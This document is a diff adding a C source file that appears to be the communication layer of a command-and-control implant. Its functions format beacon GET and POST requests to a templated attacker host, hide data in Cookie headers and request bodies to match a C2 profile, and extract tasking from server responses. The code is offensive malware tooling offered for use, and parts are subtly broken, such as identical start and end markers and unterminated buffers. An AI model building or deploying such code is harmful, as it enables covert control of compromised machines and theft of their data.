@@ -1,0 +1,81 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
+    //修改请求URL和c2profile文件中一致
+    char *requestBody = "GET /%s HTTP/1.1\r\n"
+        "Host: {{host}}\r\n"
+        "Accept: {{ http_get_client_header1 }}\r\n"
+        "Accept-Language:{{ http_get_client_header2 }}\r\n"
+        "Accept-Encoding: {{ http_get_client_header3 }}\r\n"
+        "Content-Type:application/x-www-form-urltrytryd\r\n"
+        "User-Agent: {{ useragent }}\r\n"
+        "Cookie: {{ http_get_client_metadata_prepend }}%s\r\n"
+        "Referer: http://{{host}}/\r\n"
+        "Connection: close\r\n\r\n";
+    char postPayload[20000];
+    sprintf(postPayload, requestBody, "{{ http_get_uri }}", reqData);
+
+    *outputData_len =  strlen(postPayload);
+    *outputData = (char *)calloc(1,  *outputData_len);
+    memcpy(*outputData, postPayload, *outputData_len);
+
+}
+void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {
+    char *requestBody = "POST /%s HTTP/1.1\r\n"
+        "Host: {{host}}\r\n"
+        "Accept: {{ http_get_client_header1 }}\r\n"
+        "Accept-Encoding: {{ http_get_client_header3 }}\r\n"
+        "User-Agent: {{ useragent }}\r\n"
+        "Cookie: {{ http_get_client_metadata_prepend }}%s\r\n"
+        "Referer: http://{{host}}/\r\n"
+        "Connection: close\r\n"
+        "Content-Length: %d\r\n\r\n%s";
+    char *postPayload = (char *)calloc(1, strlen(requestBody)+strlen(reqData)+200);
+    sprintf(postPayload, requestBody, "{{ http_post_uri }}", id, strlen(reqData), reqData);
+
+    *outputData_len =  strlen(postPayload);
+    *outputData = (char *)calloc(1,  *outputData_len);
+    memcpy(*outputData, postPayload, *outputData_len);
+    free(postPayload);
+}
+
+char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {
+
+    //find_payload() 从原始数据中，找到以"ffffffff1"字符串开始，"eeeeeeee2"字符串结束中间包含的数据
+
+    // ffffffff1AAAABBBBCCCCDDDDeeeeeeee2 -> AAAABBBBCCCCDDDD
+
+    // *payload_len = xx; // 返回找到的payload长度
+    // return payload; // 返回找到的payload
+    rawData = strstr(rawData, start) + strlen(start);
+
+    *payload_len = strlen(rawData) - strlen(strstr(rawData, end));
+
+    char *payload = (char *)calloc(*payload_len ,sizeof(char));
+    memcpy(payload, rawData, *payload_len);
+    return payload;
+}
+
+void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
+
+    char *start = "{{ http_get_server_prepend }}";
+    char *end = "{{ http_get_server_prepend }}";
+
+    long long payload_len = 0;
+    *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
+    *outputData_len = payload_len;
+
+}
+
+void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
+
+    char *start = "{{ http_post_server_prepend }}";
+    char *end = "{{ http_post_server_prepend }}";
+
+    long long payload_len = 0;
+    *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
+    *outputData_len = payload_len;
+}
